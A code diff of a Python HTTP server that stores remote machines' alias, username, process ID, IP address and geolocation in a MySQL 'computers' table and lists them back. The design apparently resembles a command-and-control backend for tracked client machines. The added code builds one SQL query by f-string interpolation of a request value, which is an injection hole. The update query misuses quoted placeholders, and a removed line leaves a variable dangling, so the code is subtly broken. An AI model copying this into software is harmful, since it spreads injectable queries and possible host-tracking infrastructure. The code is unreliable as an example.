@@ -2,7 +2,7 @@ import mysql.connector
 from ast import literal_eval
 import socketserver
 from threading import Thread
-from legend import server_legacy
+# from legend import server_legacy
 import requests
 
 import socket, base64
@@ -11,13 +11,13 @@ from urllib.parse import unquote
 
 global req_head, flag
 flag = False
-"""
+
 mydb = mysql.connector.connect(
     host="localhost",
     user="",
     password="",
     database="net"
-)"""
+)
 
 class Server(BaseHTTPRequestHandler):
     # def __init__(self, user='', pid='', pwd=''):
@@ -78,19 +78,58 @@ class Server(BaseHTTPRequestHandler):
                     self.send_response(200)
                     self.send_header("Content-type", "text/html")
                     self.end_headers()
-                    with open("temp.db", "r", encoding="utf-8") as f:
-                        data = f.read()
                     self.wfile.write(data.encode("utf-8"))
                     # self.wfile.close()
 
-                    # mycursor = mydb.cursor()
-                    # mycursor.execute("SELECT * FROM ]")
-                    # myresult = mycursor.fetchall()
+                    mycursor = mydb.cursor()
+                    mycursor.execute("SELECT * FROM computers")
+                    myresult = mycursor.fetchall()
+                    print(myresult)
                 else:
-                    pass
-                    # mycursor = mydb.cursor()
-                    # mycursor.execute(f"SELECT * FROM ] where alias='{alias}'")
-                    # myresult = mycursor.fetchall()
+                    mycursor = mydb.cursor()
+                    mycursor.execute(f"SELECT * FROM computers where alias='{alias}'")
+                    myresult = mycursor.fetchall()
+                    print(myresult)
+            elif port == 3333:
+                req_head = data
+                req_head = req_head.split('&')
+                # print(req_head)
+                keys, vals = [], []
+
+                for el in req_head:
+                    key = unquote(el.split('=')[0])
+                    val = unquote(el.split('=')[1])
+                    keys.append(key)
+                    vals.append(val)
+
+                req_head = dict(zip(keys, vals))
+                del keys
+                del vals
+
+                user = req_head.get('user')
+                pid = req_head.get('pid')
+                client_ip = req_head.get('ip')
+                geo = req_head.get('geo')
+                alias = req_head.get('alias')
+                status = req_head.get('status')
+		
+                del req_head
+		
+                if status == "register":
+                    sql = "INSERT INTO computers (alias, username, pid, ip, geo) VALUES (%s, %s, %s, %s, %s);"
+                    val = (alias, user, pid, client_ip, geo)
+
+                elif status == "update":
+                    sql = "update computers set username='%s', pid=%s, ip='%s', geo='%s' where alias='%s';"
+                    val = (user, pid, client_ip, geo, alias)
+ 
+                mycursor = mydb.cursor()
+                mycursor.execute(sql, val)
+                mydb.commit()
+
+
+                self.send_response(200)
+                self.end_headers()
 
         else:
 
